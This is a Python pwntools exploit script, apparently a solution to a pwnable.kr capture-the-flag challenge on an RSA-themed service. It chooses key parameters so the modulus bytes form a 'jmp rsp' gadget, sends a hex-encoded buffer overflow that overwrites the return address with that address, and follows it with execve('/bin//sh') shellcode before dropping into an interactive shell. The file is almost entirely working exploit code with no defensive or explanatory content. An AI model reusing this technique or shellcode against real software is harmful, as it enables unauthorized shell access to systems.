#!/usr/bin/python
#
# This is version exploits only buffer overflow vulnerability
#
from pwn import *

# e.g. format_addr(0xdeadbeef01234567) = 36373435323330316566626561646465
def format_addr(a):
    l = list('{:016x}'.format(a))
    l[1::2], l[::2]  = l[::2], l[1::2]
    l = l[::-1]
    o = [hex(ord(c))[2:] for c in l]
    return ''.join(o)

t = remote('pwnable.kr', 9012)

# set key pair modulus to n = p * n = 0xe4ff = `jump rsp`
t.sendline('1')
t.sendline('3')     # p
t.sendline('19541') # n
t.sendline('39081') # e > (p-1)*(n-1) only to pass key params verification
t.sendline('1')     # d

# override return address with addres of pub key modulus in .bss
junk      = 'A' * 32
ret_addr  = format_addr(0x06020C4)
shellcode =                           \
    format_addr(0xfe58426a40EC8348) + \
    format_addr(0x622fbf48529948c4) + \
    format_addr(0x545768732f2f6e69) + \
    format_addr(0x0fd28949d089495e) + \
    format_addr(0x0000000000000005)

hex_encoded = (junk + junk + junk + ret_addr + shellcode).ljust(576 * 2, 'A')
t.sendline('3')
t.sendline('-1')
t.sendline(hex_encoded)

t.interactive()
